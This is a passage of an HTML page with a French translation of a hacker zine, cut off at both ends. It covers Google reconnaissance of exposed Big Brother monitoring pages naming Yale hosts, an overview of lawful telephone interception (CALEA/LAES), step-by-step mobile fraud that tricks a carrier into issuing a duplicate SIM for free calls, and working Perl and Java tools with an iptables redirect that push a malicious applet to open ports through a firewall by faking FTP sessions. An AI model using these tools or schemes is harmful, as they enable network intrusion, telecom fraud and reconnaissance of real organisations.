+fonctionner ses services HTTP, cliquez simplement sur le bouton green' (vert):<br>
+<br>
+----------------------------------------------------<br>
+<br>
+plucky.cs.yale.edu - http<br>
+<br>
+----------------------------------------------------<br>
+&nbsp;<br>
+green Sun Jun 30 01:45:21 EDT 2002 <br>
+<br>
+<br>
+&nbsp;http://plucky.cs.yale.edu - Server OK<br>
+HTTP/1.1 200 OK<br>
+Server: Microsoft-IIS/4.0<br>
+Content-Location: http://plucky.cs.yale.edu/index.html Date: Sun, 30<br>
+Jun 2002 05:45:21 GMT<br>
+Content-Type: text/html<br>
+Accept-Ranges: bytes<br>
+Last-Modified: Tue, 12 Jan 1999 20:49:40 GMT ETag:<br>
+&quot;54b4ec126d3ebe1:4051&quot;<br>
+Content-Length: 2226<br>
+<br>
+<br>
+Seconds: 0.01 <br>
+<br>
+----------------------------------------------------<br>
+<br>
+&nbsp;&nbsp;&nbsp;&nbsp; Diable, ils tournent actuellement sous IIS 4.0 ? Ils ne 
+savent donc
+pas à quel point ils sont insécurisés ? Je m'éloigne là. A partir de cette <br>
+informations vous savez que le serveur est l'une des versions de Windows NT
+qu'il fait tourner IIS 4.0.<br>
+<br>
+&nbsp;&nbsp;&nbsp;&nbsp; Zelda montre aussi qu'il monitorent les imprimantes. 
+Maintenant, ce
+qui peut être fun; vous pouvez par exemple envoyer le message 'je pense <br>
+vous avoir hacké' à l'imprimante'philo-printer.philosophy.yale.edu'. Et
+au cas où vous vous demanderiez, l'imprimante est une 'HP LaserJet 4050 <br>
+Series'; J'ai juste à cliquer sur le bouton en dessous de la colonne
+&quot;printer&quot; (imprimante) pour le savoir.<br>
+<br>
+&nbsp;&nbsp;&nbsp;&nbsp; Ailleurs sur ce même site, je trouve que plusieurs 
+serveurs font tourner
+telnet, pop3,oracle,ftp, et imap. Plusieurs de ces services vont gentiment <br>
+vous donner la version du logiciel qui les font tourner. Oracle par exemple,
+est assez gentil pour vous montrer tout les utilisateurs connectés .Comment <br>
+pouvez-vous les remercier pour cette information valable? <br>
+<br>
+&nbsp;&nbsp;&nbsp;&nbsp; Aussi, il semble également que les géologistes de Yale 
+semblent posséder
+des données de grandes importances. Je ne pouvais pas regarder ce qu'ils
+surveillent en raison des autorisations d'accès sur leur site Web, mais je
+sais que leur serveur web tourne sur Apache 1.3.26.<br>
+<br>
+&nbsp;&nbsp;&nbsp;&nbsp; Comme vous pouvez le voir, j'aurais été capable 
+d'obtenir un énorme
+quantité de données vitales en quelques minutes. En plus, je n'ai violé <br>
+aucunes lois. Ces pages webs sont postées de telle façon que le monde
+entier peut les voir. En seulement 10 minutes ou plus pour découvrir
+quelque chose sur un système particulier, mais dans ce laps de temps j'ai
+trouvé de nombreuse choses sur 40 systèmes de la même organisation ! Merci
+Big Brother !<br>
+<br>
+&nbsp;&nbsp;&nbsp;&nbsp; Je pense qu'il doit être mentionné que l'information 
+trouvée sur
+ces pages web est une information que la plupart des organismes ne laissent
+même pas aux des employés, en dehors du département IT . Je devine que je
+devrais me sentir spécial puisque Yale doit estimer que je ne suis pas un <br>
+risque pour leur sécurité, autrement ils m'auraient incité à m'authentifier
+sur le site web.<br>
+<br>
+Imaginez cela: un ISP qui liste tous ses routeurs avec leur IPs et les
+informations relatifs à l'architecture. Si vous obtenez çà, vous pourriez
+probablement compter sur des vulnérabilités (découvertes cette année) dans
+SNMP ou mieux, compter sur les comptes/mot de passes par défaut dans ce
+type de dispositif. J'apporte seulement ceci parce que je sais que j'ai
+trouvé un ISP qui liste les routeurs et la majorité des sites retournés par <br>
+google semblent être de petits ISP.<br>
+<br>
+A propos de la recherche avec google, je vous recommande de chercher
+avec &quot;red:Big Brother&quot;, parce que ces pages vous donneront toujours plus <br>
+d'informations que lorsque le système fonctionne parfaitement.<br>
+<br>
+Finalement, je n'ai pas écrit cet article pour vous inciter à pénétrer
+des systèmes, ni pour vous fournir des moyens pour arriver au vos fins.
+J'ai écrit cela parce que la sécurité est extrêmement importante, avec
+l'information trouvée ,parce qu'avec ce produit votre environnement peut
+être compromis. Si vous êtes un administrateur système pour un site pouvant
+être révélé sur google, vous devriez sécuriser vos pages webs BB, parce que
+à l'heure actuelle, le monde entier est en mesure de connaître votre
+infrastructure.<br>
+&nbsp;</p>
+<p align="left">--[ 4 - Introduction a la Surveillance Electronique Authorisee 
+par la Loi. (Traduit par DecereBrain)<br>
+[LAES : Lawfully Authorized Electronic Surveillance]<br>
+<br>
+by Mystic &lt;mystic@lostways.net&gt;<br>
+<br>
+En 1994 le Congres a adopte le Communications Assistance for Law Enforcement Act 
+(CALEA) [Loi d'Assistance aux Communication pour le<br>
+Maintient de l'Ordre]. Son intention etait de preserver mais ne pas etendre les 
+possibilites d'ecoutes de fils des agences de maintient de l'ordre par requeter 
+les fournisseurs de telecomunications d'utiliser des systemes qui permettraient 
+aux agences gouvernementales un niveau d'acces basique dans un but de 
+surveillance. Quoiqu'il en soit, la loi ne preservait pas seulement les 
+possibilites deja existantes d'enregistrer les commnications, elle les augmente, 
+autorisant le gouvernement a collecter des informations a propos des appelant 
+par sans fil, enregister le contenu sans fil, les messages textes et les 
+communications par paquets. Le standard qui a resulte de cette legislation est 
+appele Lawfully Authorized Electronic Surveillance ou LAES.<br>
+<br>
+Un Fournisseur de Service de Telecommunications (FST) qui est compatible CALEA 
+fournit les moyens acces aux services et informations<br>
+suivants aux Agences de Maintient de l'Ordre [Law Enforcement Agencies: LEA] :<br>
+<br>
+1. Non-call associated : Information a propos de l'interception du sujet qui 
+n'est pas necessairement en lien avec un appel.<br>
+<br>
+2. Call associated : Information d'identification de l'appellant a propos des 
+appels impliquant l'interception du sujet.<br>
+<br>
+3. Information de signal Call associated et non-call associated :Signale 
+l'information initialisee par le sujet ou le reseau.<br>
+<br>
+4. Contenu de la surveillance : la capacite de monitorer les communications du 
+sujet.<br>
+<br>
+Ce processus est appele la fonction d'interception. La fonction d'interception 
+est completee de 5 fonction separees : acces,<br>
+delivrance, collection, administration de fournisseur de service, et 
+administration de maintient de l'ordre.<br>
+<br>
+----[ 4.1 La Fonction d'Acces (FA)<br>
+<br>
+La FA est constituee d'un ou plus Point d'Acces d'Interception [NDT : PAI, ou 
+IAP en VO] qui isolent les communications du sujet ou<br>
+les informations d'identification de l'appel sans obstruction. Il y a plusieurs 
+IAP differants qui peuvent etre utilises dans la fonction<br>
+d'interception. Je les ai separes en IAP Call associanted et Non-call 
+associated, et IAP de Surveillance ce contenu.<br>
+<br>
+IAP d'information Call Associated et Non-call Associated<br>
+--------------------------------------------------------<br>
+<br>
+- IAP de Service du Systeme (SSIAP) : donne des informations non-call 
+associated.<br>
+<br>
+- IAP d'Information d'Identification d'Appel (IDIAP) : donne des informations 
+call associated et, sous forme identique a ce qui suit, les evenements d'appel 
+pour des appels de circuits basiques :<br>
+<br>
+Reponse - Une partie a repondu a une tentative d'appel<br>
+Change - l'identite ou les identites d'un appel ont change<br>
+Origine - Le systeme a route un appel passe par le sujet ou le systeme a traduit 
+un appel pour le sujet<br>
+Redirection - Un appel a ete redirige (i.e., forwarde, detourne, ou devie) <br>
+Liberation - Les facilites pour l'appel entier ont ete liberees<br>
+TerminationAttempt - Une tentative d'appel a un sujet d'interception a ete 
+detecte.<br>
+<br>
+- IAP de Signal de Sujet d'Interception (ISSIAP) : fournit l'acces aux 
+informations d'appel et de signalement initailises par le sujet. Ceci inclut, si 
+le sujet d'interception utilise le forwarding d'appels, l'attente d'appel, le 
+maintient d'appel ou l'appel a trois. Ca donne egalement aux LEA la possibilite 
+de recevoir les digits composes par le sujet.<br>
+<br>
+- IAP de Signalement de Reseau (NSIAP) : Permet aux LEA d'etre informees sur les 
+mesages du reseau qui sont envoyes au sujet d'interception. Ces messages 
+incluent les informations occupe, re-ordre, sonnerie, alerte, tonalite d'attente 
+de message ou indication visuelle, attente d'appel, information d'appel ou 
+nom/numero de redirection, et le texte affiche.<br>
+<br>
+IAPs de Surveillance de Contenu<br>
+-------------------------------<br>
+<br>
+Ce qui suit sont les IAPs de surveillance de contenu qui transmettent du contenu 
+en utilisant un CCC ou un CDC. Une remarque<br>
+interessante a propos de la surveillance de contenu est que les TSPs ne sont pas 
+responsables du decryptage d'informations qui est cryptee<br>
+par le sujet de l'interception a moins que les donees soit cryptees par le TSP 
+et que le TSP a le moyen de les decrypter.<br>
+<br>
+- IAP de Circuit (CIAP) : accede au contenu de l'appel des communications du 
+mode circuit.<br>
+<br>
+- IAP de Circuit de Conferance (CCIAP) : Fournit l'acces au contenu de services 
+d'appel en conferance inities par le sujet comme les appels a trois et les 
+appels a multiples voies.<br>
+<br>
+- IAP de donnees par paquets (PDIAP) : Fournit l'acces aux paquets de donnees 
+envoyes ou recus par le sujet de l'interception.<br>
+<br>
+Ceux-ci incluent les services suivants :<br>
+<br>
+Signal ISDN d'utilisateur a utilisateur<br>
+Services de paquets X.25 ISDN D-channel<br>
+Short Messages Services (SMS) pour les cellulaires et les services de donnees en 
+mode paquet Personal Communication Services Wireless (i.e. Cellular Digital 
+Paquet Data (CDPD), CDMA, TDMA, PCS1900, ou les services de donnees en mode 
+paquet bases sur le GSM)<br>
+Les services X.25<br>
+Les services TCP/IP<br>
+Paging (une voie ou deux voies)<br>
+Les services de donnees en mode paquet utilisant les canaux de circulation<br>
+<br>
+----[ 4.2 La Fonction de Delivrance (DF)<br>
+<br>
+La DF est responsable de la delivrance de communications intercepetees a une ou 
+plusieurs Fonctions de Collection. Ceci est effectue sur deux types de canaux 
+distingts : les Canaux de Contenu d'Appel (CCC) et les Canaux d'Appels de 
+Donnees (CDC). Les CCC sont generalement utilises pour transporter du contenu 
+d'appel comme la voix ou des communications de donnees. Les CCC sont soit 
+&quot;combines&quot;, c'est a dire qu'ils portent la transmission et la reception sur le 
+meme canal, soit &quot;separes&quot;, c'est a dire que la transmission et la reception 
+sont portees sur des canaux separes. Les CDC sont generalement utilises pour 
+transporter des messages qui dont le rapport est base sur du texte comme les 
+Short Message Services (SMS). L'information dans les CDC est transmise en 
+utilisant un protocole appele Lawfully Authorized Electronic Surveillance 
+Protocol (LAESP).<br>
+<br>
+----[ 4.3 La Fonction de Collection (CF)<br>
+<br>
+La CF est responsable de la collecte et de l'analyse des communications 
+interceptees et des informations d'identification de l'appel, et est la 
+responsabilite des LEA.<br>
+<br>
+----[ 4.4 La Fonction d'Administration de Fournisseur d'Acces (SPAF)<br>
+<br>
+La SPAF est responsable du controle de l'Acces des TSP et des Fonctions de 
+Delivrance.<br>
+<br>
+----[ 4.5 La Fonction d'Administration de Maintient de l'Ordre (LEAF)<br>
+<br>
+La LEAF est responsable du controle de la Fonction de Collection des LEAS et est 
+la responsabilite des LEA.<br>
+<br>
+A present que je vous ai presente la LEAS regardons une implementation de ceci, 
+qui est actuellement sur le marche et est en usage chez quelques TSP :<br>
+<br>
+Passage en revue du CALEAserver :<br>
+<br>
+Le CALEAserver est manufacture par SS8 Networks. C'est une collection et systeme 
+de delivrance pour des informations d'appel et<br>
+de contenu. Ca permet aux reseaux existants de devenir complement compatible 
+CALEA. Ca permet a une LEA de monitorer les communications<br>
+sans ou avec fil, et de rassembler des informations a propos des appels, a 
+distance. Le CALEAserver s'interface avec le reseau a travers Signaling System 7 
+(SS7) qui est une extension du Reseau de Telephone Public Commute (RTC) [Public 
+Switched Telephone Network : PSTN]. Le CALEAserver est compose de trois couches 
+majeures : la Couche Plate-forme Materielle, le Couche Plate-forme Reseau et la 
+couche Application Logicielle.<br>
+<br>
+La Couche Plate-forme Materielle consiste en la Matrice de Commutation et la 
+Plate-forme de Calcul. La Matrice de Commutation est un commutateur programmable 
+industriel standard. Il contient des cartes T1 pour la transmission de voix et 
+des connections croisees entre les commutateurs, des cartes DSP pour les 
+circuits de conferance requis pour l'interception et la reception/generation 
+DTMF, et des cartes CPU pour la gestion du switch. La Plate-forme de Calcul est 
+une machine simple basee sur UNIX, montee en rack. Elle est utilisee pour lancer 
+le logiciel d'application du CALEAserver qui fournit les capacites de Fonction 
+de Delivrance et controle la Matrice de Commutation.<br>
+<br>
+La Couche Plate-forme Reseau fournit les capacites de SS7 aussi bien que le les 
+API de traitement d'appel pour la Couche d'Application Logicielle. Ca controle 
+egalement la Matrice de Commutation.<br>
+<br>
+La Couche d'Application Logicielle est la ou les Fonctions de Delivrance et 
+d'Administration de Fournisseur de Service sont supportees. Ca isole les 
+interfaces des Fonctions d'Acces et de Collection, de la principale 
+fonctionnalite de delivrance permttant de multiples Fonctions d'Acces et de 
+Collection a travers les Modules d'Interface qui peuvent etre ajoutes ou 
+modifies sans impact sur les fonctionnalites existantes.<br>
+<br>
+Capacites du systeme : <br>
+<br>
+Configurable pour jusqu'a :<br>
+<br>
+1000 Fonctions de Collection<br>
+128 Interfaces de Fonctions d'Acces<br>
+32 liens SS7<br>
+512 interceptions de contenu d'appel simultanees sur une unique base d'appel<br>
+64 equipements de T1 voix<br>
+<br>
+Environnment operationel :<br>
+<br>
+Compatible NEBS, -48 volt, equipement monte en rack 19&quot;<br>
+Processeur UltraSPARC de derniere generation<br>
+Bus PCI 66 MHz<br>
+Systeme d'exploitation UNIX Solaris<br>
+Disques de 9 giga-octets, SCSI 40 Mo/s<br>
+512 Mo de RAM standard<br>
+Ethernet/Fast Ethernet, 10-BaseT and 100-BaseT<br>
+Deux ports serie RS-232C/RS-423<br>
+Commutateur programmable et scalable avec jusqu'a 4000 port time slot 
+interchange<br>
+<br>
+Caracteristiques :<br>
+<br>
+Outils de tests inclus pour le test a distance<br>
+Systeme de gestion SS7 total<br>
+Rapport d'alarmes et logging des erreurs<br>
+Recuperation automatique des erreurs logicielles<br>
+Sauvegarde des disque automatique ou manuelle<br>
+Support de SNMP<br>
+Support optionel de X.25 et autres interfaces de fonctions de collection<br>
+Standart ITU MLL et support des GUI basees sur Java<br>
+Support des reseaux circuit-switched et packet-switched<br>
+Support optionel pour d'autres interfaces de fonction d'acces comme requis pour 
+la compatibilite CALEA, incluant :<br>
+*HLR (Home Location Register) <br>
+*VMS (Voice Mail System : messagerie vocale)<br>
+*SMS (Short Message System) <br>
+*CDPD wireless data <br>
+*Centre d'authentification<br>
+*Approvinionnement d'acces a distance<br>
+<br>
+<br>
+Ceci conclut l'introduction a LAES. Ceci n'etant qu'une introduction, j'ai 
+laisse tomber braucoup de details comme les informations sur le protocole. 
+Cependant, si vous etes interesses pour en lire plus sur LAES je vous suggererai 
+de lire le standard TIA J-STD-025A. J'espere que vous pourez en lire un peu plus 
+a propos des possibilites de surveillance des LEA. Si vous avez des questions 
+soyez libres de me contacter. Adresse e-mail : voir plus haut.<br>
+&nbsp;</p>
+
+<p align="left"><br>
+--[ 3 - Appels gratuits depuis un mobile<br>
+<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; par eurinomo<br>
+<br>
+&nbsp;<br>
+Ce bug peut être utilisé pour appeler gratuitement, envoyer gratuitement
+des SMS, et avoir les fonctionnalités wap gratuites.<br>
+<br>
+&nbsp;&nbsp;&nbsp; Premièrement, vous devez voir si votre opérateur mobile est 
+vulnérable&nbsp;
+au bug ou non. Appelez juste le service d'appel gratuit (pour ne pas <br>
+gaspiller de l'argent) et dites leur que votre carte (sim) est bloquée,
+que vous avez oublié votre téléphone dans la chambre de votre petite sœur
+et que votre mobile affiche &quot; Carte sim bloqué &quot; ou quelques chose dans ce
+goût là. Dites leur que votre sœur à probablement faussé le puk parce
+le téléphone était sur off, et que maintenant il est allumé. Ensuite le
+mec va dire qu'il faut que vous vous rendiez dans un magasin de téléphonie
+mobile, que vous devez leurs exposer le problème, et qu'ensuite ils vous
+donneront une autre carte avec le même numéro, et le même crédit que
+l'ancienne possédée. Demandez-leur combien tout cela va vous coûter et le
+mec va vous dire que c'est gratuit ! :-)<br>
+<br>
+Maintenant le matériel dont vous avez besoin:<br>
+- Un téléphone mobile qui n'est pas un Nokia (c'est mieux qu'il soit à
+vous, et qu'il ne soit pas débloqué)<br>
+- Et un Nokia (peut être débloqué, volé ou emprunté. Faites ce que vous
+voulez !)<br>
+<br>
+Comment procéder :<br>
+<br>
+Mobile1 =&nbsp; Non Nokia<br>
+Mobile2 =&nbsp; Nokia<br>
+<br>
+Insérez la carte dans le mobile1 et entrez votre pin. Lorsque le téléphone
+démarre tapez ce code 3 fois :<br>
+**04*00000000*00000000*00000000#<br>
+ou essayer<br>
+**05*00000000*00000000*00000000#<br>
+<br>
+&nbsp;&nbsp;&nbsp; Consultez le manuel et chercher le code nécessaire pour 
+changer le
+puk si les exemples précédents ne fonctionnent pas, ou envoyer un e-mail <br>
+à Motorola, dites-leur que votre mobile est un Motorola, et que vous
+souhaitez changer le puk et que vous savez qu'il faut changer un code
+(ce code n'est pas illégal et il est aussi spécifié dans le manuel).<br>
+<br>
+&nbsp;&nbsp;&nbsp; Si le code n'est pas le premier que j'ai donné plus haut, 
+c'est à
+près. Si vous avez une erreur motorola lorsque vous tapez **04** ou **05**&nbsp;
+<br>
+il va vous indiquer &quot; entrez l'ancien puk &quot; (ou quelque chose comme çà)
+automatiquement et ensuite demandez le nouveau code puk deux foix. Mais <br>
+le plus important dans cette histoire c'est de bloquer votre carte, je pense
+que vous pouvez également le faire si vous entrez un code pin erroné trois <br>
+fois de suite, et qu'ensuite vous entrez un puk erroné et...c'est bloqué !
+Mais ce que je viens de dire à propos du code n'a pas été testé,&nbsp; vous 
+pouvez <br>
+essayer ce dernier système également, à vos propres risques.<br>
+<br>
+&nbsp;&nbsp;&nbsp; Maintenant allez dans le magasin de téléphonie mobile et 
+racontez
+leurs ce qui s'est passé (votre petite sœur, ou une fille d'un ami de
+votre mère, enfin quelque chose comme çà ...). Ensuite, ils vont dupliquer
+la carte et ils vont vous donner la nouvelle *et* l'ancienne. A la fin,
+ils vous donnent normalement les deux. (NDT : ou prétextez pour avoir
+les deux...)<br>
+<br>
+&nbsp;&nbsp;&nbsp; Maintenant la partie facile. Insérez l'ancienne carte dans le 
+nokia,
+allumez-le et vous voyez que la carte n'est pas bloquée !!!! et si vous
+insérez la carte dans un autre phone (non Nokia), vous verrez que c'est
+bloqué. Le bug est plus un &quot; bug Nokia &quot; qu'un &quot; bug réseau &quot;. Maintenant&nbsp;
+envoyez un SMS avec l'ancienne carte et regardez si votre crédit baisse.
+Ensuite regardez si le crédit a été décompté de la nouvelle carte ; si
+ce n'est pas le cas c'est parce que le réseau est vulnérable au bug et
+vous ne perdrez pas de tunes de votre ancienne carte. Toutefois vous avez
+seulement deux semaines ou moins avant qu'ils coupent complètement la
+ligne du réseau, et que ce soit complètement bloqué, mais la nouvelle
+carte aura le même crédit que l'ancienne, et vous pouvez répéter l'opération
+encore et encore.... Je ne pense pas qu'il vous attraperont (NDT : hum...)<br>
+<br>
+Cette technique à été testée au Portugal sur le réseau GSM &quot; Vodafone &quot;<br>
+<br>
+<br>
+--[ 5 - Java traverse le firewall<br>
+<br>
+Récemment il y a eu beaucoup de bruit autour du fait qu'il y a beaucoup
+d'insécurités dans les firewalls qui supporte le traçage de sessions FTP. <br>
+Elles peuvent être dupées lorsque quelqu'un ouvre une session FTP en utilisant
+une seconde pile TCP par exemple. Je vous recommande le CERT pour une
+dossier complet. Il y a eu d'autres techniques comme certains tags intégrés
+dans des fichiers html qui font ouvrir au butineur des connections qu'un
+firewall peut interpréter comme une session FTP.<br>
+<br>
+Jetons un oeil sur l'exemple suivant :<br>
+<br>
+[ Compagnie ] ---- [ firewall ] --- [des routeurs ] --- [ WEB ] <br>
+<br>
+Une personne de 'compagnie' surfe sur le web et doit passer ses paquets
+au travers du routeur qui n'est pas sous le contrôle de 'compagnie' mais
+de l'attaquant. Scénario ordinaire non ?<br>
+<br>
+Quelques outils a été compilé pour circonvenir à une telle installation.
+Je voulais également dire, pour autant que vous activiez un traçage vous <br>
+êtes perdu. Tous les chemins mènent à Rome ;)<br>
+<br>
+Laissez-moi vous expliquez ces petit outils vite fait.<br>
+<br>
+Html-redirect : l'attaquant installe ceci sur un routeur et fixe une
+règle de redirection sur le port 8888.<br>
+<br>
+Class-inject : L'attaquant démarre ceci avec eftepe.class. html-redirect
+va rediriger les requêtes html à ce mini-httpd. Il force le butineur à
+l'intérieur de la compagnie qui est protégé par le firewall, à charger
+l'applet java. Ce dernier simule des sessions FTP actives à un routeur et
+est autorisé parce que des managers de sécurité voient un routeur comme
+l'origine de eftepe.class. Le firewall va ensuite ouvrir le port 7350 entrant,
+et ainsi vous pourrez vous connecter sur le routeur:20 à la company:7350.<br>
+<br>
+ftpd : L'attaquant doit démarrer ceci sur un routeur pour simuler une
+session FTP.<br>
+<br>
+Createclass : Le script pour créer le code java correct qui utilise l'ip
+appropriée (d'un routeur) et du port (de 'company') ensuite l'attaquant
+peut aussi prendre place sur le web (c'est à dire phrack.org :) et intègrent
+des applets java malicieux. Ainsi prenez garde car X fonctionne sur le
+port 6000. :-)<br>
+<br>
+C'est vraiment très simple, et tout ceci ne vaut pas vraiment un article,
+c'est pourquoi vous allez trouver plus bas un add-on.<br>
+<br>
+&lt;classinject&gt;<br>
+#!/usr/bin/perl -w<br>
+<br>
+# Met un fichier class dans le butineur distant<br>
+#<br>
+<br>
+use IO::Socket;<br>
+<br>
+sub usage<br>
+{<br>
+print &quot;Usage: $0 &lt;class file&gt;\n\n&quot;;<br>
+exit;<br>
+}<br>
+<br>
+my $classfile = shift || usage();<br>
+my $class;<br>
+my $classlen = (stat($classfile))[7];<br>
+open I, &quot;&lt;$classfile&quot; or die $!;<br>
+read I, $class, $classlen;<br>
+close I;<br>
+<br>
+my $sock = new IO::Socket::INET-&gt;new(Listen =&gt; 10,<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+LocalPort =&gt; 8080,<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+Reuse =&gt; 1) or die $!;<br>
+my $conn;<br>
+<br>
+for (;;) {<br>
+next unless $conn = $sock-&gt;accept();<br>
+if (fork() &gt; 0) {<br>
+$conn-&gt;close();<br>
+next;<br>
+}<br>
+my $request = &lt;$conn&gt;;<br>
+if ($request =~ /$classfile/) {<br>
+my $classcontent = &quot;HTTP/1.0 200 OK\r\n&quot;.<br>
+&nbsp;&quot;Server: Apache/1.3.6 (Unix)\r\n&quot;.<br>
+&nbsp;&quot;Content-Length: $classlen\r\n&quot;.<br>
+&nbsp;&quot;Content-Type: application/octet-stream\r\n\r\n&quot;.$class;<br>
+print $conn $classcontent;<br>
+print &quot;Injected to &quot;, $conn-&gt;peerhost(), &quot;\n&quot;;<br>
+} else {<br>
+print $conn &quot;&lt;HTML&gt;&quot;.<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &quot;&lt;APPLET 
+CODE=\&quot;$classfile\&quot; WIDTH=1 HEIGHT=1&gt;&quot;.<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+&quot;&lt;/APPLET&gt;&lt;/HTML&gt;\r\n\r\n&quot;;<br>
+}<br>
+$conn-&gt;close();<br>
+exit(0);<br>
+}<br>
+&lt;/classinject&gt;<br>
+&lt;createclass&gt;<br>
+#!/usr/bin/perl -w<br>
+<br>
+$ENV{&quot;PATH&quot;} = $ENV{&quot;PATH&quot;}.&quot;/usr/lib/java/bin&quot;;<br>
+<br>
+print &quot;Creating apropriate Java class-file for opeing port &gt; 1023\n&quot;;<br>
+print &quot;Enter IP to connect to on port 21 (e.g. '127.0.0.1'):&quot;;<br>
+my $ip = &lt;STDIN&gt;; chop($ip);<br>
+print &quot;Enter port to open:&quot;;<br>
+my $port = &lt;STDIN&gt;; chop($port);<br>
+my $p1 = int $port/256;<br>
+my $p2 = $port%256;<br>
+<br>
+open O, &quot;&gt;eftepe.java&quot; or die $!;<br>
+print O&lt;&lt;EOF;<br>
+<br>
+import java.io.*;<br>
+import java.applet.*;<br>
+import java.util.*;<br>
+import java.net.*;<br>
+<br>
+public class eftepe extends Applet {<br>
+<br>
+public void init()<br>
+{<br>
+try {<br>
+Socket s = new Socket(&quot;$ip&quot;, 21);<br>
+OutputStream os = s.getOutputStream();<br>
+BufferedReader in = new BufferedReader(new 
+InputStreamReader(s.getInputStream()));<br>
+PrintWriter pw = new PrintWriter(os, true);<br>
+in.readLine();<br>
+pw.println(&quot;USER ftp\\r\\n&quot;);<br>
+in.readLine();<br>
+pw.println(&quot;PASS ftp\\r\\n&quot;);<br>
+in.readLine();<br>
+String port = new String(&quot;PORT &quot;);<br>
+String me = InetAddress.getLocalHost().getHostAddress();<br>
+port += me.replace('.', ',');<br>
+port += &quot;,$p1,$p2\\r\\n&quot;;<br>
+pw.println(port);<br>
+for(;;);<br>
+} catch (Exception e) {<br>
+e.printStackTrace();<br>
+}<br>
+}<br>
+<br>
+}<br>
+EOF<br>
+<br>
+print &quot;Compiling into classfile...\n&quot;;<br>
+system(&quot;javac eftepe.java&quot;);<br>
+print &quot;Done. Results are in eftepe.class\n&quot;;<br>
+<br>
+&lt;/createclass&gt;<br>
+<br>
+&lt;ftpd&gt;<br>
+#!/usr/bin/perl -w<br>
+<br>
+use IO::Socket;<br>
+<br>
+my $sock = new IO::Socket::INET-&gt;new(Listen =&gt; 10,<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+LocalPort =&gt; 21,<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+Reuse =&gt; 1) or die $!;<br>
+my $conn;<br>
+<br>
+for (;;) {<br>
+$conn = $sock-&gt;accept();<br>
+if (fork() &gt; 0) {<br>
+$conn-&gt;close();<br>
+next;<br>
+}<br>
+print $conn &quot;220 ready\r\n&quot;;<br>
+&lt;$conn&gt;;&nbsp; # user<br>
+print $conn &quot;331 Password please\r\n&quot;;<br>
+&lt;$conn&gt;;&nbsp; # pass<br>
+print $conn &quot;230 Login successful\r\n&quot;;<br>
+&lt;$conn&gt;;&nbsp; #port<br>
+print $conn &quot;200 PORT command successful.\r\n&quot;;<br>
+sleep(36);<br>
+$conn-&gt;close();<br>
+exit 0;<br>
+}<br>
+&lt;/ftpd&gt;<br>
+<br>
+&lt;html-redirect&gt;<br>
+#!/usr/bin/perl -w<br>
+<br>
+# Simple HTTP Redirector<br>
+#<br>
+<br>
+# iptables -A PREROUTING -t nat -p tcp --dport 80 -j REDIRECT --to-port 8888<br>
+<br>
+use IO::Socket;<br>
+<br>
+sub usage<br>
+{<br>
+print &quot;Usage: $0 &lt;IP|Host&gt;\n&quot;.<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &quot;\t\tIP|Host -- IP or Host to redirect HTML 
+reuests to\n\n&quot;;<br>
+exit;<br>
+}<br>
+<br>
+my $r = shift || usage();<br>
+my $redir = &quot;HTTP/1.0 301 Moved Permanently\r\n&quot;.<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &quot;Location: 
+http://$r:8080\r\n\r\n&quot;;<br>
+<br>
+my $sock = new IO::Socket::INET-&gt;new(Listen =&gt; 10,<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+LocalPort =&gt; 8888,<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+Reuse =&gt; 1) or die $!;<br>
+my $conn;<br>
+<br>
+for (;;) {<br>
+next unless $conn = $sock-&gt;accept();<br>
+if (fork() &gt; 0) {<br>
+$conn-&gt;close();<br>
+next;<br>
+}<br>
